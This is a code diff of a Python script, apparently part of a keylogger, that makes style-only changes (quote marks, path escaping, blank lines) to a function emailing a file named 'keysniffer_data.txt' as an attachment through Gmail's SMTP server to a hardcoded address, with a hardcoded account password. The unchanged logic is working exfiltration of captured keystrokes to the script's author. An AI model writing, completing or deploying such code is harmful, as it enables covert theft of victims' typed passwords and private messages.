@@ -43,18 +43,17 @@ import getpass
 from requests import get
 
 
-
-
-email_address = "7unkym0nk3y@gmail.com" # Enter disposable email here
-password = "test..123" # Enter email password here
+email_address = "7unkym0nk3y@gmail.com"  # Enter disposable email here
+password = "test..123"  # Enter email password here
 
 username = getpass.getuser()
 
 toaddr = "7unkym0nk3y@gmail.com"
 keys_information = "keysniffer_data.txt"
-file_path = "C:\Users\Cyb3r_Tyr\Documents"
+file_path = "C:\\Users\\Cyb3r_Tyr\\Documents"
 extend = "\\"
 file_merge = file_path + extend
+
 
 def send_email(filename, attachment, toaddr):
 
@@ -62,30 +61,30 @@ def send_email(filename, attachment, toaddr):
 
     msg = MIMEMultipart()
 
-    msg['From'] = fromaddr
+    msg["From"] = fromaddr
 
-    msg['To'] = toaddr
+    msg["To"] = toaddr
 
-    msg['Subject'] = "Log File"
+    msg["Subject"] = "Log File"
 
     body = "Body_of_the_mail"
 
-    msg.attach(MIMEText(body, 'plain'))
+    msg.attach(MIMEText(body, "plain"))
 
     filename = filename
-    attachment = open(attachment, 'rb')
+    attachment = open(attachment, "rb")
 
-    p = MIMEBase('application', 'octet-stream')
+    p = MIMEBase("application", "octet-stream")
 
     p.set_payload((attachment).read())
 
     encoders.encode_base64(p)
 
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
 
     msg.attach(p)
 
-    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s = smtplib.SMTP("smtp.gmail.com", 587)
 
     s.starttls()
 
@@ -96,5 +95,6 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
 
     s.quit()
+
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
